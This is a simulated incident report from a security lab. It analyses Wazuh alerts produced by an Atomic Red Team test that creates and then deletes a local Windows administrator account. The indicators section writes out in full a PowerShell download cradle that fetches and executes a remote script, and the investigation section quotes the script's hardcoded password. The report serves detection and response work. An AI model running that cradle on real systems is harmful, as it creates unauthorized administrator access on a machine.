# 🚨 Incident report: unauthorized local administrator created via PowerShell

> **Simulated incident.** This report documents Atomic Red Team test T1136.001-9 on the lab endpoint, written as if it were a real incident. The run analyzed here took place on Nov 9, 2026 (the alerts for a later re-run are in [`detections.md`](detections.md#t1136-001-9)).

Level markers are the same as in `detections.md`: 🔴 12+ · 🟠 8-11 · 🟡 4-7 · ⚪ 0-3.

## 📝 1. Summary
On Nov 9, 2026 at 13:40:06 UTC, a PowerShell command on host Win11-Victim (user `labuser`) downloaded a script from the internet and executed it in memory. The script created a local account, `NewLocalUser`, added it to the Administrators group, and deleted it about 4 seconds later. There is currently no evidence of further activity.

The technique was identified by custom rule 100101 (🟠 level 10, T1136.001): "PowerShell script block creates a local user via .NET AccountManagement (UserPrincipal)". Built-in rules flagged the use of `iex` (91837, level 4) and recorded the account and group changes (60109, 60154), but none identified how the account was created.

## 🔔 2. Detection
- The first alert of the run was **91837** (🟡 level 4, 13:40:06.912 UTC), which flagged string execution through `iex` ("Get-Content -Stream or Invoke-Expresion"). No built-in rule identified the download itself.
- The first alert that identified the technique was custom rule **100101** (🟠 level 10, 13:40:06.944 UTC).
- Alert 92213 (🔴 level 15) also fired at the start of the run. It is a known false positive caused by PowerShell's script policy test file, and it was excluded from the analysis.

## 🕒 3. Timeline (UTC)
| Time | Rule | Level | Description | MITRE tag (as set by Wazuh) |
|:---:|:---:|:---:|:---|:---:|
| 13:40:06.896 | 92213 | 🔴 15 | Executable file dropped in folder commonly used by malware (known false positive) | T1105 |
| 13:40:06.912 | 91837 | 🟡 4 | PowerShell executed "Get-Content -Stream or Invoke-Expresion". Possible string execution as code | T1059.001 |
| 13:40:06.944 | **100101** | 🟠 **10** | **PowerShell script block creates a local user via .NET AccountManagement (UserPrincipal)** | **T1136.001** |
| 13:40:07.786 | 60160 | 🟡 5 | Domain Users Group Changed | T1484 |
| 13:40:07.788 | 60109 | 🟠 8 | User account enabled or created | T1098 |
| 13:40:07.800 | 60110 | 🟠 8 | User account changed | T1098 |
| 13:40:07.897 | 60154 | 🔴 12 | Administrators Group Changed (account added) | T1484 |
| 13:40:07.946 | 92033 | ⚪ 3 | Discovery activity spawned via PowerShell execution | T1087, T1059.001 |
| 13:40:07.962 | 92039 | ⚪ 3 | A net.exe account discovery command was initiated | T1087 |
| 13:40:10.688 | 60154 | 🔴 12 | Administrators Group Changed (account removed) | T1484 |
| 13:40:10.689 | 60160 | 🟡 5 | Domain Users Group Changed | T1484 |
| 13:40:10.702 | 60111 | 🟠 8 | User account disabled or deleted | T1098, T1531 |

Note: the technique IDs in the last column are the tags Wazuh's built-in rules assign. Some are a loose fit. For example, T1484 (Domain or Tenant Policy Modification) does not describe adding a user to a local group.

## 🔍	 4. Investigation
- PowerShell downloaded a script from the internet and ran it with `iex`. The URL is visible in the `scriptBlockText` field of the alert: `https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1`
- The downloaded script was then executed (script block ID `fb7d203d-b397-4190-85fe-cdc87efdb106`). Its own comment states its purpose: it creates a new user, adds it to a local administrator group, and then deletes the user.
- The script contains hardcoded credentials (`$userName = "NewLocalUser"`, `$password = "P@ssw0rd123456789!"`). According to `win.system.message`, the account was added to the Administrators group, then removed from the group and deleted.
- Alerts 92033 and 92039 show the script running `net user NewLocalUser` to check that the account existed, which is part of the script's design.
- The activity ran under the account `labuser` (`data.win.eventdata.subjectUserName`), which has administrator rights.

## 💥	 5. Impact
- The script created the account `NewLocalUser` and added it to the Administrators group, which gives full control of the machine. An attacker could have installed software, disabled security tools, or accessed sensitive data.
- No evidence of these actions has been found, and the account was deleted.

## 🚦 6. Severity
**High.** A local administrator was created by a script downloaded from the internet through PowerShell. It is not rated critical, because the account was deleted and there is no evidence of further compromise.

Note: this was a controlled simulation on an isolated lab VM. In production, the rating would depend on how the attacker obtained administrator rights.

## 🚩	 7. Indicators of compromise (IOCs)
- **URL:** `https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1` (the domain itself is legitimate, so the specific URL or the cradle pattern should be hunted, not the whole domain)
- **Download cradle:** `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')`
- **Account name:** `NewLocalUser` (weak indicator, easy for an attacker to change)
- **Script block ID:** `fb7d203d-b397-4190-85fe-cdc87efdb106` (from 100101; evidence reference only)
- **Processes involved:** powershell.exe, net.exe, net1.exe (legitimate Windows binaries)

## 🧯 8. Response
1. **Contain:** isolate the host temporarily.
2. **Preserve:** keep the logs and the script block text.
3. **Eradicate:** confirm the account is gone, then check for other persistence, such as scheduled tasks, new services, or Run keys.
4. **Investigate:** the script ran under `labuser`, which has administrator rights. Determine how the attacker obtained access to this account.
5. **Scope and recover:** search other hosts for the URL, reset the credentials of the account that ran the script, and rebuild the host from a known-good state if anything else is found.

## 💡	 9. Lessons learned and detection improvements
- Built-in rule 91837 flagged the use of `iex` at level 4, and no built-in alert identified the download itself.
- Improvement: write a new rule that matches the download cradle pattern (`DownloadString` combined with `iex`) at a high level. Raising 91837 itself would be too noisy, because many legitimate admin scripts use `iex`.
- Before rule 100101, only the outcome (account and group changes) was alerted, not the method. The rule closes that gap, with limits: it only matches this .NET library, and legitimate admin scripts that use it could trigger it. See [`custom-rules.md`](custom-rules.md).
